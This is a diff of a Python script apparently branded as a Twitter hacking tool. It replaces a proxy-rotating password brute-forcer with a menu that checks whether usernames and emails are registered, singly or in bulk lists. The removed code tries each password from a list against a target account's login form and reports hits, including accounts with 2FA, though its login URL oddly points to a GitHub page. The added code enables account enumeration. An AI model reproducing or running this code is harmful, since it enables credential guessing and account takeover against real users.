@@ -1,104 +1,143 @@
-import mechanize
-import argparse
-import sys
-import os
-from proxylist import ProxyList
-import logging
+import requests as s
+import sys, os, time, signal, webbrowser, platform, subprocess
+from time import sleep
 
 
-print('''\033[1;36m
-    .'``.``.
- __/ (o) `, `.
-'-=`,     ;   `.
-    \    :      `-.
-    /    ';        `.
-   /      .'         `.
-   |     (      `.     `-.._
-    \     \` ` `. \         `-.._
-     `.   ;`-.._ `-`._.-. `-._   `-._
-       `..'     `-.```.  `-._ `-.._.'
-         `--..__..-`--'      `-.,'
-            `._)`/
-             /--(
-          -./,--'`-,
-       ,^--(                    
-       ,--' `-,         v1.2  
-        **************************************
-        * -> Development: 𝐃𝐀𝐑𝐊-𝐔𝐂𝐄𝐘 𝐓𝐄𝐂𝐇        *
-        * -> whatsapp://wa.me/+254107065646 *
-        * -> GitHub: https://github.com/Jaydendev112 *
-        * -> wa.group: https://chat.whatsapp.com/JxQIsr7k3ofKAFF7S5zM74
-        **************************************  
-                                                       
-\033[1;m''')
+def signal_handler(signal, frame):
+		KURO()
+		LOGO()
+		print('\033[1;m [\033[1;31mX\033[1;m] You pressed Ctrl+C!')
+		time.sleep(2)
+		EXITMENU()
+signal.signal(signal.SIGINT, signal_handler)
+
+#~~~ Function KURO ~~~~
+def KURO():
+	if os.name == 'nt':
+            os.system('cls')
+	else:
+            os.system('clear')
+
+
+#-------------------------------
 
 
 
-b = mechanize.Browser()
-b.set_handle_equiv(True)
-b.set_handle_gzip(True)
-b.set_handle_redirect(True)
-b.set_handle_referer(True)
-b.set_handle_robots(False)
-b._factory.is_html = True
 
-b.addheaders = [('User-agent',
-                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
-                 )]
+def ketik(s):
+	for ASU in s + '\n':
+		sys.stdout.write(ASU)
+		sys.stdout.flush()
+		sleep(50. / 1000)
 
-username = input('\033[1;DARKTECH: \033[1;37m')
-passwordList = input('\033[1;PASSWORD45: \033[1;37m')
-proxyList = input('\033[1;37mproxy : \033[1;37m')
-def proxy():
-    logging.basicConfig()
-    pl = ProxyList()
+os.system('clear')
+
+print (' ')
+ketik ("\033[1;36m Welcome to the integrated tool of hack Twitter I think over time it will be supported with a guess ....\033[1;36m")
+sleep(0.5)
+
+print ('''
+       ===========    /////////////
+          ====        |  twitter  |/
+          ====        |-----------|/ 
+          ====        |   𝐃𝐀𝐑𝐊  |/ 
+          ====        | 𝐓𝐄𝐂𝐇 |/ 
+          ====        |___________|/
+>---------------------------------------->
+Developer: DARK HACKER 
+Whatsapp: https://wa.me/254107065646
+''')
+
+base_url = 'https://twitter.com/users'
+email_sub_url = '/email_available?email='
+username_sub_url = '/username_available?username='
+
+
+
+
+def check_email(email):
+    email = email.replace(" ", "")
     try:
-        pl.load_file(proxyList)
-    except:
-        sys.exit('\033[1;31m[!] Proxy File format has incorrect | EXIT...\033[1;31m')
-    pl.random()
-    getProxy = pl.random().address()
-    b.set_proxies(proxies={"https": getProxy})
-    try:
-        checkProxyIP = b.open("https://api.ipify.org/?format=raw", timeout=2)
-    except:
-        return proxy()
-        
-        
-def Twitter():
-    password = open(passwordList).read().splitlines()
-    try_login = 0
-    print("\033[1;DARKTECH Account: {}\033[1;31m".format(username))
-    for password in password:
-        try_login += 1
-        if try_login == 10:
-            try_login = 0
-        sys.stdout.write('\r[-] {} [-] '.format(password))
-        sys.stdout.flush()
-        url = "https://github.com/Jaydendev112/Tweeter-py-hack"
-        try:
-            response = b.open(url, timeout=2)
-            b.select_form(nr=0)
-            b.form['session[username_or_email]'] = username
-            b.form['session[password]'] = password
-            b.method = "POST"
-            response = b.submit()
+        response = s.get(base_url+email_sub_url+email)
+        data = response.json()
+        if data['valid'] is True:
+            print(str(email)+" == Available!")
+        elif data['valid'] is False:
+            print(str(email)+" == Unavailable, " + data['msg'])
+        else:
+            print("Something wrong")
+    except Exception as e:
+        print("Something wrong " + str(e))
 
-            if len(response.geturl()) == 27:
-                print(f'\n\033[1;31m [+] Good ^_^ [{username}]:[{password}] [+] \033[1;31m')
-                proxy()
-                break
-            elif response.geturl() == "https://mobile.twitter.com/login/check":
-                print(f'\n\033[1;31m [+] Good ^_^ [{username}]:[{password}] [+] --> But There is a 2FA \033[1;31m')
-                proxy()
+
+
+def check_username(username):
+    username = username.replace(" ", "")
+    try:
+        if 4 < len(username) < 15:
+            response = s.get(base_url+username_sub_url+username)
+            data = response.json()
+            if 'valid' in data:
+                if data['valid'] is True:
+                    print(str(username)+" == Available!")
+                elif data['valid'] is False:
+                    print(str(username)+" == Unavailable, "+data['msg'])
             else:
-                print('\033[1;37m NO !\033[1;37m')
-        except KeyboardInterrupt:
-            print('\n ok exit ')
-            sys.stdout.flush()
-            proxy()
+                print("Something wrong")
+        else:
+            print(str(username)+" == Sorry, Your username must be more than 4 and shorter than 15 characters")
+    except Exception as e:
+        print("Something wrong " + str(e))
+
+
+def main():
+    while True:
+        print("\n>---------------------------------------->\n1 For Check Username"
+              "\n2 For Check Email\n3 For Check username list\n4 For Check email list\n5 Search with images inside Twitter\n6 Save Twitter \n7 snapchat me falah ^_+ \nPress q to quit.\n\n")
+        option = input("Your Option: ")
+        if option == 'q' or option == 'Q':
             break
+        elif option == '1':
+            username = input("\nPlease enter the username: ")
+            check_username(username)
+        elif option == '2':
+            email = input("\nPlease enter the email: ")
+            check_email(email)
+        elif option == '3':
+            f = input("\nPlease enter the path your username file: ")
+            try:
+                username_file = open(f, 'r')
+                username_list = username_file.read()
+                for username in username_list.splitlines():
+                    check_username(username)
+            except Exception as e:
+                print("Something wrong, "+str(e))
+            else:
+                username_file.close()
+        elif option == '4':
+            f = input("\nPlease enter the path of your email file: ")
+            try:
+                email_file = open(f, 'r')
+                email_list = email_file.read()
+                for email in email_list.splitlines():
+                    check_email(email)
+            except Exception as e:
+                print("Something wrong, " + str(e))
+            else:
+                email_file.close()
+        
+        elif option == '5':
+            username = input(" username: ")
             
+            webbrowser.open('https://twitter.com/search?f=images&vertical=default&q='+username+'')
+        
+        elif option == '7':
+            webbrowser.open('https://www.snapchat.com/add/flaah999')
+        
+        elif option == '6':
+            webbrowser.open('https://download-twitter-videos.com/ar/')
+        
+            continue
+
 if __name__ == '__main__':
-    Twitter()
-    proxy()
+    main()
